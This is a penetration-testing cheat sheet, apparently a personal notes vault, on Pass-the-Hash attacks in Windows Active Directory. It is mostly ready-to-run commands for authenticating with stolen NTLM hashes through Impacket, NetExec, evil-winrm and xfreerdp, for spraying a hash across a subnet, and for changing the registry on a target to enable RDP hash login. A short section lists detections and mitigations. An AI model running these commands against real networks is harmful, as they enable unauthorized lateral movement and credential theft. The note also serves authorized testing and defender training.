---
tags: [pentest, kerberos, pth, ntlm, ad, active-directory, initial-access, windows]
phase: 5
---
# Pass-the-Hash (PtH)

Authenticate using an NTLM hash directly instead of a cleartext password. NTLM auth never sends the password - it proves possession of the hash - so the hash IS the credential.

[[06 - Gaining Access/00 - README|Folder index]]

## When this works

- Target accepts NTLM (most internal AD services still do).
- Target service supports the protocol (SMB, WinRM, RDP-with-RestrictedAdmin, etc.).
- You have the hash (from SAM dump, NTDS, mimikatz, Responder + crack-but-relay-instead, etc.).

## Get the hash

See:
- [[14 - secretsdump]] - NTDS / SAM dump
- [[29 - Mimikatz Deep Dive]] - LSASS dump
- [[11 - Responder LLMNR NBT-NS Poisoning]] - NetNTLMv2 (NOT NTLM - cannot PtH; must crack)

> [!warning] NTLM vs NetNTLMv2
> You can PtH **NTLM** hashes. You CANNOT PtH **NetNTLMv1/v2** hashes - those are challenge-response. NetNTLMv2 must be cracked or relayed.

## Commands

```bash
# Impacket
impacket-psexec -hashes :<NTLM> corp.local/admin@10.0.0.5
impacket-wmiexec -hashes :<NTLM> corp.local/admin@10.0.0.5
impacket-smbexec -hashes :<NTLM> corp.local/admin@10.0.0.5
impacket-atexec  -hashes :<NTLM> corp.local/admin@10.0.0.5 'whoami'
impacket-secretsdump -hashes :<NTLM> corp.local/admin@10.0.0.5

# NetExec
nxc smb 10.0.0.0/24 -u admin -H <NTLM> --local-auth
nxc smb 10.0.0.5    -u admin -H <NTLM> -d corp.local
nxc winrm 10.0.0.5  -u admin -H <NTLM>

# evil-winrm
evil-winrm -i 10.0.0.5 -u admin -H <NTLM>

# RDP (Restricted Admin mode only)
xfreerdp /u:admin /pth:<NTLM> /v:10.0.0.5

# Internal: enable Restricted Admin once on target
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0
```

## Local vs domain hash

| Hash type | Auth flag |
| --- | --- |
| Local admin (`Administrator:500`) | `--local-auth` (nxc) or omit domain |
| Domain account | Include domain: `corp.local/admin` |

## LM + NT hash format

```text
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
^^ LM (often empty: aad3b435...)         ^^ NTLM
```

Some tools want `LM:NT`, others just `NT`. With Impacket: `-hashes :<NT>` (empty LM before colon).

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `STATUS_LOGON_FAILURE` | Wrong hash, or local hash being passed as domain (or vice versa). Try `--local-auth`. |
| `STATUS_ACCESS_DENIED` | Hash is right; no rights on this service. Try another protocol (WinRM, MSSQL). |
| `[-] Kerberos SessionError` | Service might require Kerberos. Use [[18 - Pass-the-Ticket]] instead. |
| Hash works on one host, not another | Local SAM hashes are per-host. Domain hashes work everywhere the user has rights. |
| RDP PtH fails with NLA error | Target doesn't have Restricted Admin enabled. Either skip RDP or enable on target first. |

## Spray PtH with NetExec

```bash
# Same hash against many hosts (local admin reuse)
nxc smb 10.0.0.0/24 -u admin -H <NTLM> --local-auth --continue-on-success
# Pwn3d! anywhere = lateral movement target
```

## Defender's view

- LSASS dumping detection (Sysmon Event ID 10).
- Detect anomalous NTLM auth via Event ID 4624 Type 3 with NTLM package.
- Disable NTLM where possible (`Restrict NTLM` GPO).
- Credential Guard / LSASS PPL protect against in-memory hash extraction.
- LAPS (random local admin password per host) breaks lateral PtH via reused local creds.

## See also

- [[18 - Pass-the-Ticket]]
- [[19 - Overpass-the-Hash]]
- [[14 - secretsdump]]
